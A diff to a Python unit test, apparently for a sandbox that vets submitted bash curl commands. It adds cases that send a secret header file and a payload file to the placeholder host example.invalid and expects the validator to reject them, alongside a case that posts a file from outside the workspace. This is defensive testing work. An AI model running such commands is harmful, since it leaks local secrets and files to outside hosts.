@@ -122,6 +122,12 @@ class BashSubmissionResolutionTest(unittest.TestCase):
             outside = workspace.parent / "outside-payload.txt"
             outside.write_text("outside secret", encoding="utf-8")
             cases = {
+                "curl -H @secret-header.txt --data-binary @payload.txt "
+                "https://example.invalid": "header_file_reference_unsupported",
+                "curl --header=@secret-header.txt --data-binary @payload.txt "
+                "https://example.invalid": "header_file_reference_unsupported",
+                "curl -H@secret-header.txt --data-binary @payload.txt "
+                "https://example.invalid": "header_file_reference_unsupported",
                 "curl --data-binary @../outside-payload.txt https://example.invalid": (
                     "file_reference_outside_workspace"
                 ),
